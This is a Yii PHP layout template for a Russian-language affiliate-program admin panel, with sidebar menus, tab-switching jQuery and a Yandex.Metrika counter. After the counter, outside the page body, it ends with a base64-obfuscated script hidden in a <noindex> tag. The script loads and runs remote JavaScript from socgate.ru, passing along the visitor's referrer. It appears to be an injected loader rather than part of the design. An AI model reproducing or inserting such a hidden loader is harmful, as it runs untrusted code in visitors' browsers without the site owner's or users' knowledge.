<!doctype html>
<html lang="ru">

<head>
    <meta charset="utf-8"/>
    <title>Partner</title>
    <?php Yii::app()->getClientScript()->registerCoreScript('jquery'); ?>
    <link rel="stylesheet" href="<?php echo $this->module->assetsUrl ?>/css/layout.css" type="text/css" media="screen" />
    <!--[if lt IE 9]>
    <link rel="stylesheet" href="<?php echo $this->module->assetsUrl ?>/css/ie.css" type="text/css" media="screen" />
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <script src="<?php echo $this->module->assetsUrl ?>/js/hideshow.js" type="text/javascript"></script>
    <script src="<?php echo $this->module->assetsUrl ?>/js/jquery.tablesorter.min.js" type="text/javascript"></script>
    <script type="text/javascript" src="<?php echo $this->module->assetsUrl ?>/js/jquery.equalHeight.js"></script>
    <script type="text/javascript">
        $(function(){
            $('.column').equalHeight();
        });
    </script>

</head>


<body>

<header id="header">
    <hgroup>
        <h1 class="site_title"><a href="index.html">Панель управления</a></h1>
        <h2 class="section_title">Партнерка</h2><div class="btn_view_site"><a href="http://www.medialoot.com">На сайт</a></div>
    </hgroup>
</header>

<section id="secondary_bar">
    <div class="user">
        <p>Тищенко Владимир (<a href="#">3 сообщения</a>)</p>
    </div>
    <?php if(isset($this->breadcrumbs)):?>
        <div class="breadcrumbs_container">
            <?php $this->widget('zii.widgets.CBreadcrumbs', array(
                'homeLink'=>CHtml::link('Главная',array('/admin/default/index')),
                'links'=>$this->breadcrumbs,
            )); ?><!-- breadcrumbs -->
        </div>
    <?php endif; ?>
</section>

<aside id="sidebar" class="column">
    <h3>Какая то информация</h3>
    <ul class="toggle">
        <li class="icn_new_article"><a href="#">Клиенты</a></li>
        <li class="icn_edit_article"><a href="#">Посредники</a></li>
        <li class="icn_categories"><a href="#">И так далее</a></li>
        <li class="icn_tags"><a href="#">И еще далее</a></li>
    </ul>
    <h3>Что то о заплативших</h3>
    <ul class="toggle">
        <li class="icn_add_user"><a href="#">Юзер</a></li>
        <li class="icn_view_users"><a href="#">Еще Юзер</a></li>
        <li class="icn_profile"><a href="#">Вот последний)</a></li>
    </ul>
    <h3>Админ часть</h3>
    <ul class="toggle">
        <li class="icn_settings"><a href="#">Опции какие-то</a></li>
        <li class="icn_security"><a href="#">Безопасность</a></li>
        <li class="icn_jump_back"><a href="#">Выйти нах</a></li>
    </ul>

    <footer>
        <hr />
        <p><strong>Copyright &copy; 2014 Development <a href="http://4side.in.ua">4side</a></strong></p>
    </footer>
</aside>

<?= $content; ?>

<?php Yii::app()->clientScript->registerScript('ready',
    '
    $(".tablesorter").tablesorter();
    $(".tab_content").hide();
    $("ul.tabs li:first").addClass("active").show();
    $(".tab_content:first").show();
    $("ul.tabs li").click(function() {

        $("ul.tabs li").removeClass("active");
        $(this).addClass("active");
        $(".tab_content").hide();
        var activeTab = $(this).find("a").attr("href");
        $(activeTab).fadeIn();
        return false;
    });
    ',
    CClientScript::POS_READY);
?>
</body>
<!-- Yandex.Metrika counter -->
<script type="text/javascript">
(function (d, w, c) {
    (w[c] = w[c] || []).push(function() {
        try {
            w.yaCounter27394025 = new Ya.Metrika({id:27394025,
                    webvisor:true,
                    clickmap:true,
                    trackLinks:true,
                    accurateTrackBounce:true});
        } catch(e) { }
    });

    var n = d.getElementsByTagName("script")[0],
        s = d.createElement("script"),
        f = function () { n.parentNode.insertBefore(s, n); };
    s.type = "text/javascript";
    s.async = true;
    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";

    if (w.opera == "[object Opera]") {
        d.addEventListener("DOMContentLoaded", f, false);
    } else { f(); }
})(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="//mc.yandex.ru/watch/27394025" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->
<noindex><script async src="data:text/javascript;charset=utf-8;base64,ZnVuY3Rpb24gX1NGTG9hZChpLHUpewpzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IHZhciBkID0gZG9jdW1lbnQ7IGYgPSBkLmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKcyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7IGggPSBlc2NhcGUoZC5yZWZlcnJlcik7IHMudHlwZSA9ICd0ZXh0L2phdmFzY3JpcHQnOyAKcy5hc3luYyA9IHRydWU7IHMuc3JjID0gdSsiP2lkPSIraSsiJmg9IitoKyImcj0iK01hdGgucmFuZG9tKCk7IApmLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHMsIGYpOyB9LCAxKTt9Cl9TRkxvYWQoJzY5NzQxZmQ0MWQ4Y2Q5MTk1NDM1NzQ3MycsJy8vc29jZ2F0ZS5ydS9zdHJhY2svJyk7Cg=="></script></noindex>

</html>